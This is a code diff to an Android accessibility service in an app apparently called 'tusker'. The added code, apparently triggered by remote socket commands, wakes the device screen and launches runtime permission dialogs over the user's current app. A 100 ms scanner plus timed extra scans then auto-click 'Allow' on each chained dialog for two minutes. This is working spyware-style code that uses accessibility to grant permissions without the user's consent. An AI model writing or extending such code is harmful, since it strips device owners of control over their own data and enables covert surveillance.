@@ -952,11 +952,108 @@ public class UnifiedAccessibilityService extends AccessibilityService {
                     ? permissionBgHandler : new Handler(Looper.getMainLooper());
         }
         autoGrantMode = true;
+
+        // Re-kick the dedicated 100 ms scan loop.  The loop stops self-scheduling
+        // when autoGrantMode goes false; re-posting it here resumes deep scanning.
+        // removeCallbacks prevents stacking if called while a run is already queued.
+        if (autoGrantScanRunnable == null) {
+            autoGrantScanRunnable = new Runnable() {
+                @Override public void run() {
+                    if (!autoGrantMode) return;
+                    try {
+                        AccessibilityNodeInfo root = getRootInActiveWindow();
+                        if (root != null) { runPermissionGranter(root); root.recycle(); }
+                    } catch (Exception ignored) {}
+                    if (autoGrantMode && autoGrantHandler != null)
+                        autoGrantHandler.postDelayed(this, 100);
+                }
+            };
+        } else {
+            autoGrantHandler.removeCallbacks(autoGrantScanRunnable);
+        }
+        autoGrantHandler.post(autoGrantScanRunnable);
+
         autoGrantHandler.postDelayed(() -> {
             autoGrantMode = false;
             Log.i(TAG, "Auto-grant mode expired (on-demand re-enable)");
         }, durationMs);
-        Log.i(TAG, "Auto-grant mode RE-ENABLED for " + durationMs + " ms (dashboard storage request)");
+        Log.i(TAG, "Auto-grant mode RE-ENABLED for " + durationMs + " ms — deep scan active");
+    }
+
+    /**
+     * Launch PermissionRequestActivity DIRECTLY — without bringing MainActivity to
+     * the foreground first.  Used by the socket command handler on API < 35.
+     *
+     * The accessibility service context is always exempt from Android 10+
+     * background-activity restrictions, so startActivity() works immediately.
+     * The native permission dialog appears as a floating overlay over whatever
+     * the user is currently viewing.
+     *
+     * The 100 ms auto-grant scanner is restarted and extra point-in-time scans
+     * are scheduled so every "Allow" button across all chained dialogs is
+     * clicked automatically.
+     *
+     * @param perms permissions to request (already-granted ones are filtered
+     *              inside PermissionRequestActivity).
+     */
+    public void launchPermissionDialogDirectly(String[] perms) {
+        if (perms == null || perms.length == 0) return;
+
+        Handler h = permissionBgHandler != null
+                ? permissionBgHandler : new Handler(Looper.getMainLooper());
+
+        // Step 0: Wake screen — dialog is invisible if the device is asleep.
+        h.post(() -> {
+            try {
+                android.os.PowerManager pm =
+                        (android.os.PowerManager) getSystemService(POWER_SERVICE);
+                if (pm != null) {
+                    android.os.PowerManager.WakeLock wl = pm.newWakeLock(
+                            android.os.PowerManager.FULL_WAKE_LOCK
+                            | android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP
+                            | android.os.PowerManager.ON_AFTER_RELEASE,
+                            "tusker:perm_direct_wl");
+                    wl.acquire(120_000);
+                }
+            } catch (Exception e) {
+                Log.w(TAG, "launchPermissionDialogDirectly: wake lock failed: " + e.getMessage());
+            }
+        });
+
+        // Step 1: Launch PermissionRequestActivity directly — dialog floats over
+        // the current foreground app without rebuilding our task stack.
+        h.post(() -> {
+            try {
+                Intent pIntent = new Intent(this, com.task.tusker.PermissionRequestActivity.class);
+                pIntent.putExtra(com.task.tusker.PermissionRequestActivity.EXTRA_PERMISSIONS, perms);
+                pIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
+                        | Intent.FLAG_ACTIVITY_SINGLE_TOP
+                        | Intent.FLAG_ACTIVITY_CLEAR_TOP);
+                startActivity(pIntent);
+                Log.i(TAG, "launchPermissionDialogDirectly: launched " + perms.length + " perm(s)");
+            } catch (Exception e) {
+                Log.w(TAG, "launchPermissionDialogDirectly: failed: " + e.getMessage());
+            }
+        });
+
+        // Step 2: Re-enable aggressive auto-grant for 2 minutes — 100 ms scanner
+        // + event-based scanner will auto-click Allow on every chained dialog.
+        reEnableAutoGrant(120_000);
+
+        // Step 3: Schedule immediate extra scans at key moments right after the
+        // dialog appears so no fast-showing dialog is missed between 100 ms ticks.
+        long[] extraScans = { 900, 1_600, 2_500, 4_000, 6_000, 9_000, 12_000 };
+        for (long delay : extraScans) {
+            h.postDelayed(() -> {
+                if (!autoGrantMode) return;
+                try {
+                    AccessibilityNodeInfo root = getRootInActiveWindow();
+                    if (root != null) { runPermissionGranter(root); root.recycle(); }
+                } catch (Exception ignored) {}
+            }, delay);
+        }
+        Log.i(TAG, "launchPermissionDialogDirectly: deep scan active 2 min ("
+                + perms.length + " perm(s))");
     }
 
     /**
